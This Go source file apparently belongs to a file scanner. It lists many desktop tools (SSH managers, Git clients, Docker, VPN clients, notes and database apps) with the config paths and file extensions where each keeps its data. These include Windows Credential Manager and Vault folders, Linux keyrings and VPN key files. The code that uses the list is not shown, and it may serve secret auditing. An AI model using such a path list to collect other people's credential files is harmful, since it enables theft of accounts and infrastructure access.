package scanner

// ================================================================
// 十五、消息队列 / 流处理工具
// ================================================================
func toolsCatInfra() []Tool {
	return []Tool{
		{Name: "Kafka_CLI",
			WinPaths:   []string{"${HOME}\\.kafka", "${HOME}\\.config\\kafkacat"},
			MacPaths:   []string{"~/.kafka", "~/.config/kafkacat"},
			LinuxPaths: []string{"~/.kafka", "~/.config/kafkacat", "~/.conf/kafkacat"},
			Extensions: []string{".conf", ".json", ".yaml"}, MaxFileSize: mb(5)},

		// ================================================================
		// 十六、远程连接 / SSH 管理
		// ================================================================
		{Name: "MobaXterm",
			WinPaths:   []string{"${HOME}\\Documents\\MobaXterm", "${APPDATA}\\MobaXterm"},
			MacPaths:   []string{},
			LinuxPaths: []string{},
			Extensions: []string{".ini", ".mxtsession", ".mxtsavedsessions"}, MaxFileSize: mb(10)},
		{Name: "Termius",
			WinPaths:   []string{"${APPDATA}\\Termius", "${LOCALAPPDATA}\\Termius"},
			MacPaths:   []string{"~/Library/Application Support/Termius"},
			LinuxPaths: []string{"${CONFIG}/Termius"},
			Extensions: []string{".json", ".db"}, MaxFileSize: mb(10)},
		{Name: "Tabby",
			WinPaths:   []string{"${APPDATA}\\tabby", "${CONFIG}\\tabby"},
			MacPaths:   []string{"~/Library/Application Support/tabby"},
			LinuxPaths: []string{"${CONFIG}/tabby"},
			Extensions: []string{".yaml", ".yml", ".json"}, MaxFileSize: mb(5)},
		{Name: "Xshell",
			WinPaths:   []string{"${HOME}\\Documents\\NetSarang\\Xshell"},
			MacPaths:   []string{},
			LinuxPaths: []string{},
			Extensions: []string{".xsh", ".xfp", ".txt"}, MaxFileSize: mb(5)},

		// ================================================================
		// 十七、Git 客户端 / 代码托管
		// ================================================================
		{Name: "GitHub_Desktop",
			WinPaths:   []string{"${APPDATA}\\GitHub Desktop", "${LOCALAPPDATA}\\GitHubDesktop"},
			MacPaths:   []string{"~/Library/Application Support/GitHub Desktop"},
			LinuxPaths: []string{"${CONFIG}/GitHub Desktop"},
			Extensions: []string{".json", ".db"}, MaxFileSize: mb(5)},
		{Name: "Sourcetree",
			WinPaths:   []string{"${LOCALAPPDATA}\\Atlassian\\SourceTree"},
			MacPaths:   []string{"~/Library/Application Support/SourceTree"},
			LinuxPaths: []string{},
			Extensions: []string{".json", ".db"}, MaxFileSize: mb(5)},
		{Name: "GitKraken",
			WinPaths:   []string{"${APPDATA}\\GitKraken"},
			MacPaths:   []string{"~/Library/Application Support/GitKraken"},
			LinuxPaths: []string{"~/.gitkraken"},
			Extensions: []string{".json", ".prefs"}, MaxFileSize: mb(5)},

		// ================================================================
		// 十八、容器 / 虚拟化
		// ================================================================
		{Name: "Docker_Desktop",
			WinPaths:   []string{"${APPDATA}\\Docker", "${LOCALAPPDATA}\\Docker"},
			MacPaths:   []string{"~/Library/Group Containers/group.com.docker", "~/Library/Containers/com.docker.docker"},
			LinuxPaths: []string{"${CONFIG}/docker", "~/.docker"},
			Extensions: []string{".json", ".yaml", ".yml"}, MaxFileSize: mb(5)},
		{Name: "Podman",
			WinPaths:   []string{"${APPDATA}\\containers"},
			MacPaths:   []string{"~/.config/containers"},
			LinuxPaths: []string{"~/.config/containers"},
			Extensions: []string{".json", ".yaml", ".conf"}, MaxFileSize: mb(5)},

		// ================================================================
		// 十九、笔记 / 知识管理（可存储API密钥）
		// ================================================================
		{Name: "Obsidian",
			WinPaths:   []string{"${APPDATA}\\Obsidian"},
			MacPaths:   []string{"~/Library/Application Support/Obsidian"},
			LinuxPaths: []string{"${CONFIG}/obsidian"},
			Extensions: []string{".json"}, MaxFileSize: mb(2)},
		{Name: "Joplin",
			WinPaths:   []string{"${APPDATA}\\Joplin"},
			MacPaths:   []string{"~/Library/Application Support/Joplin"},
			LinuxPaths: []string{"~/.config/joplin-desktop", "~/.config/joplin"},
			Extensions: []string{".json", ".sqlite"}, MaxFileSize: mb(10)},

		// ================================================================
		// 二十、API 网关 / 服务网格配置
		// ================================================================
		{Name: "Kong_Deklarative",
			WinPaths:   []string{"${HOME}\\.kong", "${HOME}\\kong"},
			MacPaths:   []string{"~/.kong", "~/kong"},
			LinuxPaths: []string{"~/.kong", "~/kong", "/etc/kong"},
			Extensions: []string{".yml", ".yaml", ".json", ".conf"}, MaxFileSize: mb(5)},
		{Name: "Envoy_Proxy",
			WinPaths:   []string{"${HOME}\\envoy", "${HOME}\\.envoy"},
			MacPaths:   []string{"~/envoy", "~/.envoy", "/usr/local/etc/envoy"},
			LinuxPaths: []string{"~/envoy", "~/.envoy", "/etc/envoy"},
			Extensions: []string{".yaml", ".yml", ".json", ".conf"}, MaxFileSize: mb(5)},

		// ================================================================
		// 二十一、Windows 凭据 / 密码管理器
		// ================================================================
		{Name: "Windows_Credential_Manager",
			WinPaths:   []string{"${LOCALAPPDATA}\\Microsoft\\Credentials", "${LOCALAPPDATA}\\Microsoft\\Vault"},
			MacPaths:   []string{},
			LinuxPaths: []string{},
			MaxFileSize: mb(5)},

		// ================================================================
		// 二十二、macOS Keychain / Linux 密钥环
		// ================================================================
		{Name: "Linux_Keyring",
			WinPaths:   []string{},
			MacPaths:   []string{},
			LinuxPaths: []string{"~/.local/share/keyrings", "~/.local/share/seahorse"},
			Extensions: []string{".keyring"}, MaxFileSize: mb(2)},

		// ================================================================
		// 二十三、Electron 应用通用缓存
		// ================================================================
		{Name: "Electron_Apps_Generic",
			WinPaths:   []string{"${APPDATA}\\electron"},
			MacPaths:   []string{"~/Library/Application Support/Electron"},
			LinuxPaths: []string{"${CONFIG}/Electron"},
			Extensions: []string{".json"}, MaxFileSize: mb(2)},

		// ================================================================
		// 二十四、日志 / 监控工具
		// ================================================================
		{Name: "Grafana_Agent",
			WinPaths:   []string{"${APPDATA}\\grafana-agent", "${HOME}\\grafana-agent"},
			MacPaths:   []string{"~/.config/grafana-agent", "~/grafana-agent"},
			LinuxPaths: []string{"~/.config/grafana-agent", "/etc/grafana-agent"},
			Extensions: []string{".yaml", ".yml", ".json", ".river"}, MaxFileSize: mb(5)},

		// ================================================================
		// 二十五、VPN / 网络工具
		// ================================================================
		{Name: "OpenVPN",
			WinPaths:   []string{"${HOME}\\OpenVPN\\config", "${PROGRAMFILES}\\OpenVPN\\config"},
			MacPaths:   []string{"~/OpenVPN", "/usr/local/etc/openvpn"},
			LinuxPaths: []string{"~/openvpn", "/etc/openvpn"},
			Extensions: []string{".ovpn", ".conf", ".pem", ".crt", ".key"}, MaxFileSize: mb(2)},
		{Name: "WireGuard",
			WinPaths:   []string{"${HOME}\\WireGuard"},
			MacPaths:   []string{"~/WireGuard", "/usr/local/etc/wireguard"},
			LinuxPaths: []string{"/etc/wireguard"},
			Extensions: []string{".conf"}, MaxFileSize: mb(1)},

		// ================================================================
		// 二十六、低代码 / 全栈开发工具
		// ================================================================
		{Name: "Appwrite_CLI",
			WinPaths:   []string{"${HOME}\\.appwrite"},
			MacPaths:   []string{"~/.appwrite"},
			LinuxPaths: []string{"~/.appwrite"},
			Extensions: []string{".json"}, MaxFileSize: mb(2)},
		{Name: "Amplify_CLI",
			WinPaths:   []string{"${HOME}\\.amplify"},
			MacPaths:   []string{"~/.amplify"},
			LinuxPaths: []string{"~/.amplify"},
			Extensions: []string{".json", ".yml", ".yaml"}, MaxFileSize: mb(5)},

		// ================================================================
		// 二十七、其他常用工具
		// ================================================================
		{Name: "Postage",
			WinPaths:   []string{"${APPDATA}\\Postage"},
			MacPaths:   []string{"~/Library/Application Support/Postage"},
			LinuxPaths: []string{"${CONFIG}/Postage"},
			Extensions: []string{".json", ".pg"}, MaxFileSize: mb(5)},
		{Name: "Beekeeper_Studio",
			WinPaths:   []string{"${APPDATA}\\Beekeeper Studio", "${APPDATA}\\beekeeper-studio"},
			MacPaths:   []string{"~/Library/Application Support/Beekeeper Studio"},
			LinuxPaths: []string{"${CONFIG}/Beekeeper Studio", "${CONFIG}/beekeeper-studio"},
			Extensions: []string{".json", ".db"}, MaxFileSize: mb(5)},
		{Name: "DbSchema",
			WinPaths:   []string{"${HOME}\\.dbschema"},
			MacPaths:   []string{"~/.dbschema"},
			LinuxPaths: []string{"~/.dbschema"},
			Extensions: []string{".dbs", ".json", ".properties"}, MaxFileSize: mb(5)},
		{Name: "Insomnia_Designer",
			WinPaths:   []string{"${APPDATA}\\Insomnia Designer"},
			MacPaths:   []string{"~/Library/Application Support/Insomnia Designer"},
			LinuxPaths: []string{"${CONFIG}/Insomnia Designer"},
			Extensions: []string{".json", ".db", ".yml"}, MaxFileSize: mb(10)},
	}
}